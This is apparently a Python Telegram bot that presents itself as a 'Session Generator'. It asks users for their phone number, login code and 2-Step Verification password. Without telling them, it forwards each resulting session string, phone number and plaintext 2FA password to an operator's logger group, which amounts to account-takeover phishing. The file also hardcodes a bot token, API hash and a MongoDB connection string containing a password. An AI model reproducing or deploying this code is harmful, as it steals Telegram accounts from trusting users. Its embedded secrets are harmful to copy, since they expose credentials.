import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from pymongo import MongoClient

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
LOGGER_GROUP = -1002477750706  # Replace with your Logger Group ID
MUST_JOIN = "SANATANI_TECH"  # Channel to join

# 🔹 MongoDB Setup
mongo_client = MongoClient("mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net")
db = mongo_client["TelegramBot"]
users_collection = db["joined_users"]

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Function to check if a user is in the channel
async def is_user_in_channel(user_id):
    try:
        permissions = await bot.get_permissions(MUST_JOIN, user_id)
        return permissions is not None
    except:
        return False

# 🔹 Start command with buttons
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id
    if not await is_user_in_channel(user_id):
        await event.respond(
            f"🚨 You must join {MUST_JOIN} to use this bot!\nClick below to join.",
            buttons=[[Button.url("📢 Join Channel", f"https://t.me/{MUST_JOIN[1:]}")]]
        )
        return
    
    # Save user to database
    users_collection.update_one({"user_id": user_id}, {"$set": {"joined": True}}, upsert=True)

    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("🆘 Help", b"help")],
            [Button.url("📖 Join Our Channel", f"https://t.me/{MUST_JOIN[1:]}")]
        ]
    )

# 🔹 Button Handler
@bot.on(events.CallbackQuery)
async def callback(event):
    user_id = event.sender_id
    if event.data == b"generate":
        await ask_phone(event)
    elif event.data == b"help":
        await event.respond("📌 **How to Generate a Session String:**\n\n1️⃣ Click **Generate Session**\n2️⃣ Enter your phone number\n3️⃣ Enter the OTP you receive\n4️⃣ If asked, enter your 2-Step Verification password\n5️⃣ Copy your session string and use it!")

# 🔹 Generate Session Command
@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
        return
    
    # Check if user is in the channel
    if not await is_user_in_channel(user_id):
        await event.respond(
            f"🚨 You must join {MUST_JOIN} to use this bot!\nClick below to join.",
            buttons=[[Button.url("📢 Join Channel", f"https://t.me/{MUST_JOIN[1:]}")]]
        )
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")

# 🔹 Cancel Command
@bot.on(events.NewMessage(pattern="/cancel"))
async def cancel_process(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
        await event.respond("❌ **Process Cancelled!** You can start again using /generate.")
    else:
        await event.respond("⚠️ **You are not in any active process.**")

# 🔹 Process User Input (Phone, OTP, Password)
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  # Ignore messages from users not in process

    step = user_sessions[user_id]["step"]
    
    # ✅ Step 1: User enters phone number
    if step == "phone":
        phone_number = event.message.text.strip()
        
        if not phone_number.startswith("+") or not phone_number[1:].isdigit() or len(phone_number) < 10 or len(phone_number) > 15:
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return
        
        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 2: User enters OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        
        if not otp_code.isdigit():
            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()

            # Log Session in Logger Group
            await bot.send_message(LOGGER_GROUP, f"📝 **New Session Generated:**\n\n👤 User: `{user_id}`\n📱 Phone: `{phone_number}`\n🔑 Session:\n`{session_string}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            if "The confirmation code has expired" in str(e):
                del user_sessions[user_id]
                await event.respond("❌ **Error:** The OTP has expired. Please use /generate to start again.")
            elif "Two-steps verification is enabled" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 3: User enters password (if needed)
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            # Log Session with 2FA in Logger Group
            await bot.send_message(LOGGER_GROUP, f"📝 **New Session Generated (With 2FA):**\n\n👤 User: `{user_id}`\n📱 Phone: `{phone_number}`\n🔑 Session:\n`{session_string}`\n🔒 2FA Password: `{password}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
